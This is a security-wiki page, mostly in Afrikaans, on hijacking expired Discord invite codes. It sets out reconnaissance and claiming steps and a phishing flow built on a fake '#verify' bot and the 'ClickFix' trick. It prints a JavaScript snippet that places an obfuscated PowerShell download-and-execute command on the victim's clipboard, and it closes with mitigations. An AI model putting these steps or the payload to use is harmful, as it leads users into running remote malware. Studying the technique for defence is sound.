# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord se invite-stelsel se kwesbaarheid stel threat actors in staat om vervalde of geskrapte invite-kodes (tydelike, permanente of custom vanity) as nuwe vanity-skakels op enige Level 3 boosted server te eis. Deur alle kodes na lowercase te normaliseer, kan aanvallers bekende invite-kodes vooraf registreer en verkeer stilweg hijack sodra die oorspronklike skakel verval of die bronserver sy boost verloor.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | Ná verstryking word die kode beskikbaar en kan dit deur ’n boosted server as ’n vanity URL herregistreer word. |
| Permanent Invite Link | ⚠️          | Indien dit geskrap word en slegs uit lowercase letters en digits bestaan, kan die kode weer beskikbaar word.        |
| Custom Vanity Link    | ✅          | Indien die oorspronklike server sy Level 3 Boost verloor, word sy vanity invite beskikbaar vir nuwe registrasie.    |

## Exploitation Steps

1. Reconnaissance
- Monitor openbare bronne (forums, sosiale media, Telegram-kanale) vir invite-skakels wat by die patroon `discord.gg/{code}` of `discord.com/invite/{code}` pas.<sup>[[1]](#references)</sup>
- Versamel invite-kodes van belang (temporary of vanity).
2. Pre-registration
- Skep of gebruik ’n bestaande Discord server met Level 3 Boost-regte.
- Gaan in **Server Settings → Vanity URL** en probeer om die teiken-invite-kode toe te wys. Indien dit aanvaar word, word die kode deur die malicious server gereserveer.
3. Hijack Activation
- Vir temporary invites, wag totdat die oorspronklike invite verval (of skrap dit handmatig indien jy die bron beheer).
- Vir kodes wat uppercase bevat, kan die lowercase-variant onmiddellik geëis word, hoewel redirection eers ná verstryking geaktiveer word.
4. Silent Redirection
- Gebruikers wat die ou skakel besoek, word naatloos na die attacker-controlled server gestuur sodra die hijack aktief is.

## Phishing Flow via Discord Server

1. Beperk server-kanale sodat slegs ’n **#verify**-kanaal sigbaar is.<sup>[[1]](#references)</sup>
2. Ontplooi ’n bot (bv. **Safeguard#0786**) om nuwe gebruikers te versoek om via OAuth2 te verifieer.
3. Die bot herlei gebruikers na ’n phishing-webwerf (bv. `captchaguard.me`) onder die voorwendsel van ’n CAPTCHA- of verification-stap.
4. Implementeer die **ClickFix** UX-truuk:
- Vertoon ’n gebroke CAPTCHA-boodskap.
- Lei gebruikers om die **Win+R**-dialoog oop te maak, ’n voorafgelaaide PowerShell-opdrag te plak en Enter te druk.

### ClickFix Clipboard Injection Example
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Hierdie benadering vermy direkte lêeraflaaie en benut bekende UI-elemente om gebruikers se agterdog te verminder.<sup>[[1]](#references)</sup>

## Versagtingsmaatreëls

- Gebruik permanente uitnodigingskakels wat minstens een hoofletter of nie-alfanumeriese karakter bevat (verval nooit nie, nie-herbruikbaar).<sup>[[1]](#references)</sup>
- Roteer uitnodigingskodes gereeld en herroep ou skakels.
- Monitor Discord-bediener se boost-status en vanity URL-eise.
- Leer gebruikers om die egtheid van bedieners te verifieer en vermy die uitvoer van opdragte wat vanaf die knipbord geplak is.

## Verwysings

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
